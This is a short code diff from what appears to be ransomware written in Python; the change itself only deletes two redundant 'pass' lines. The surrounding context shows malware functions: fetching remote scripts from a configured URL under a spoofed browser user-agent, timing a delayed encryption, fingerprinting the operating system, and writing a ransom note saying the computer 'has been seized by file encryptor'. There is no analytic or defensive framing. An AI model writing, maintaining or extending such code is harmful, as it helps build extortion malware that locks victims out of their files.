@@ -464,7 +464,6 @@ def pull_scripts():
 	headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.66'}
 	r = requests.get(Config.PULL_URL, headers=headers)
 	deb(f'{r.text}')
-	pass
 
 def get_activation_time() -> str:
 	return str(int(str(time.time()).split('.')[0]) + 60 * Config.SLEEP_TIME_UNTIL_ENCRYPTION_MINUTES)
@@ -649,7 +648,6 @@ def detect_malware_type():
 	deb("OS: " + OSINFO.caption)
 
 	sys.exit(-4)
-	pass
 
 def write_advert(file):
 	file.write(f"This computer has been seized by file encryptor.\r\nIf you need your files back here is the decryption process:\r\n")
